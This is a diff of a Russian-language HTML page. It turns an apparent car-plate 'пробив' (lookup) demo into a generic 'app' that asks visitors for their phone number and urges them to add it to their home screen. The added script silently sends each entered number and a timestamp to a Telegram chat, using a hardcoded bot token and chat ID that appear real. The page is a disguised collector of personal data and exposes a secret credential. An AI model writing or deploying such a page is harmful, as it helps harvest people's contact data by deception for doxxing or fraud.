@@ -2,89 +2,82 @@
 <html lang="ru">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Пробив по номеру авто</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>Приложение</title>
+
+<link rel="manifest" href="manifest.json">
+<link rel="apple-touch-icon" href="icon.png">
+
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
 
 <style>
 * {
   margin: 0;
   padding: 0;
   box-sizing: border-box;
-  font-family: 'Inter', sans-serif;
+  font-family: -apple-system, BlinkMacSystemFont, Inter, sans-serif;
 }
 
 body {
-  background: radial-gradient(circle at top, #0f172a, #020617);
-  color: #fff;
   min-height: 100vh;
+  background: radial-gradient(circle at top, #0f172a, #020617);
+  color: white;
   display: flex;
-  align-items: center;
   justify-content: center;
-  overflow-x: hidden;
+  align-items: center;
 }
 
-.container {
+.app {
   width: 100%;
   max-width: 420px;
   padding: 30px;
-  background: rgba(15, 23, 42, 0.85);
-  border-radius: 20px;
-  box-shadow: 0 0 60px rgba(56,189,248,0.25);
-  animation: fadeIn 1s ease;
+  background: rgba(15,23,42,.9);
+  border-radius: 22px;
+  box-shadow: 0 0 60px rgba(56,189,248,.25);
+  animation: fade 1s ease;
 }
 
-@keyframes fadeIn {
-  from { opacity: 0; transform: translateY(30px); }
-  to { opacity: 1; transform: translateY(0); }
+@keyframes fade {
+  from {opacity:0; transform:translateY(30px)}
+  to {opacity:1; transform:translateY(0)}
 }
 
 h1 {
   text-align: center;
-  font-size: 26px;
   margin-bottom: 10px;
 }
 
-.subtitle {
+p {
   text-align: center;
-  font-size: 14px;
   color: #94a3b8;
-  margin-bottom: 25px;
+  font-size: 14px;
+  margin-bottom: 20px;
 }
 
 input {
   width: 100%;
   padding: 15px;
-  border-radius: 12px;
+  border-radius: 14px;
   border: none;
   outline: none;
   font-size: 16px;
   background: #020617;
-  color: #fff;
+  color: white;
   box-shadow: inset 0 0 0 1px #1e293b;
-}
-
-input::placeholder {
-  color: #64748b;
 }
 
 button {
   width: 100%;
   margin-top: 15px;
   padding: 15px;
+  border-radius: 14px;
+  border: none;
   font-size: 16px;
   font-weight: 600;
-  border: none;
-  border-radius: 12px;
-  background: linear-gradient(135deg, #38bdf8, #6366f1);
-  color: #020617;
   cursor: pointer;
-  transition: transform 0.2s ease, box-shadow 0.2s ease;
-}
-
-button:hover {
-  transform: translateY(-2px);
-  box-shadow: 0 10px 30px rgba(99,102,241,0.4);
+  background: linear-gradient(135deg,#38bdf8,#6366f1);
+  color: #020617;
 }
 
 .loader {
@@ -92,14 +85,14 @@ button:hover {
   margin: 20px auto;
   width: 40px;
   height: 40px;
-  border: 4px solid rgba(255,255,255,0.2);
+  border: 4px solid rgba(255,255,255,.2);
   border-top-color: #38bdf8;
   border-radius: 50%;
   animation: spin 1s linear infinite;
 }
 
 @keyframes spin {
-  to { transform: rotate(360deg); }
+  to {transform:rotate(360deg)}
 }
 
 .success {
@@ -107,68 +100,49 @@ button:hover {
   text-align: center;
   margin-top: 20px;
   color: #22c55e;
-  font-size: 14px;
-}
-
-.footer {
-  margin-top: 25px;
-  text-align: center;
-  font-size: 12px;
-  color: #64748b;
 }
 </style>
 </head>
 
 <body>
 
-<div class="container">
-  <h1>Пробив по номеру авто</h1>
-  <div class="subtitle">Быстро · Анонимно · Онлайн</div>
+<div class="app">
+  <h1>Введите номер</h1>
+  <p>Для полноценной работы<br>добавьте приложение на экран «Домой»</p>
 
-  <input id="plate" placeholder="A123BC77">
-  <button onclick="sendRequest()">Заказать пробив</button>
+  <input id="phone" placeholder="+7 999 123-45-67">
+  <button onclick="send()">Отправить</button>
 
   <div class="loader" id="loader"></div>
   <div class="success" id="success">
-    Заявка отправлена.<br>Ожидайте ответ в Telegram
-  </div>
-
-  <div class="footer">
-    Демонстрационный сервис
+    Данные отправлены ✅
   </div>
 </div>
 
 <script>
-const BOT_TOKEN = "PASTE_BOT_TOKEN";
-const CHAT_ID = "PASTE_CHAT_ID";
+const BOT_TOKEN = "8236421554:AAE9oirQ5eJPqwxlC66QZhYIo2RytrCktCo";
+const CHAT_ID = "7523840597";
 
-function sendRequest() {
-  const plate = document.getElementById("plate").value.trim();
-  if (!plate) {
-    alert("Введите номер автомобиля");
+function send() {
+  const phone = document.getElementById("phone").value.trim();
+  if (!phone) {
+    alert("Введите номер телефона");
     return;
   }
 
   document.getElementById("loader").style.display = "block";
-  document.getElementById("success").style.display = "none";
-
-  const text = `
-🚗 Новый запрос
-Номер: ${plate}
-Время: ${new Date().toLocaleString()}
-`;
 
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     method: "POST",
-    headers: { "Content-Type": "application/json" },
+    headers: {"Content-Type": "application/json"},
     body: JSON.stringify({
       chat_id: CHAT_ID,
-      text: text
+      text: `📱 Новый номер:\n${phone}\n\n⏰ ${new Date().toLocaleString()}`
     })
   }).then(() => {
     document.getElementById("loader").style.display = "none";
     document.getElementById("success").style.display = "block";
-    document.getElementById("plate").value = "";
+    document.getElementById("phone").value = "";
   });
 }
 </script>
